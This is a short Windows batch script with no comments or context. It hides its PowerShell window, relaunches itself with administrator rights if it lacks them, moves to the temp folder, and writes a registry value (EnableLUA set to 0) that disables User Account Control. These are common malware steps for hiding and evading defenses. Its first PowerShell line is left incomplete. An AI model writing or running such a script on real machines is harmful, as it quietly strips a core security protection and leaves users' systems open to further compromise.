@echo off
powershell.exe -windowstyle Hidden -command
Net session >nul 2>&1 || (PowerShell start -verb runas '%~0' &exit /b)
title z%random% && cd %temp%

cmd.exe %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
exit